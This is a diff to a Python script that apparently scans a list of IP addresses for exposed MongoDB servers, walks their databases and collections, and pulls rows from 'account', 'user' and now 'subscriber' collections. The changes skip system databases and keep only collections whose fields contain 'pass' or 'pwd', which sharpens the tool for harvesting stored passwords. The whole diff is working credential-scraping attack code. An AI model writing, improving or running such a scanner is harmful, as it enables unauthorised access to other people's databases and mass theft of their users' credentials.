@@ -17,7 +17,7 @@ formatter = ColoredFormatter("%(log_color)s[%(levelname)-4s] %(message)s%(reset)
 console.setFormatter(formatter)
 mongo_logger.addHandler(console)
 
-table_names = ['account', 'user']
+table_names = ['account', 'user', 'subscriber']
 column_names = ['pass', 'pwd']
 
 for ip in ips:
@@ -29,6 +29,10 @@ for ip in ips:
     mongo_logger.debug("Database found: " + ', '.join(dbs))
 
     for db in dbs:
+        # Skip local system databases
+        if db in ['admin', 'local']:
+            continue
+
         o_db = client[db]
         try:
             collections = o_db.collection_names()
@@ -46,6 +50,20 @@ for ip in ips:
                 continue
 
             o_coll = o_db[collection]
+
+            row = o_coll.find_one()
+            interesting = False
+
+            for key, value in row.iteritems():
+                # Is that a column we're interested into?
+                if any(column in key for column in column_names):
+                    interesting = True
+                    break
+
+            # This collection has no interesting data? Let's skip it
+            if not interesting:
+                continue
+
             rows = o_coll.find()
             total = rows.count()
 
